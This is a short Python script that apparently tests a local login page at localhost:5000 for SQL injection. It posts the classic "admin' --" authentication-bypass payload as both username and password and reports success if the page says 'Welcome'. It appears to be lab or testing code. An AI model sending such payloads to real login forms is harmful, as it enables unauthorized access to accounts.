import requests

url = "http://localhost:5000/login"
payload = "admin' --"
data = {
    "username": payload,
    "password": payload
}

print(f"Sending payload: {payload}")
res = requests.post(url, data=data)
print(f"Status Code: {res.status_code}")
if "Welcome" in res.text:
    print("SUCCESS: SQLi worked!")
else:
    print("FAILURE: SQLi failed.")
    print(res.text)
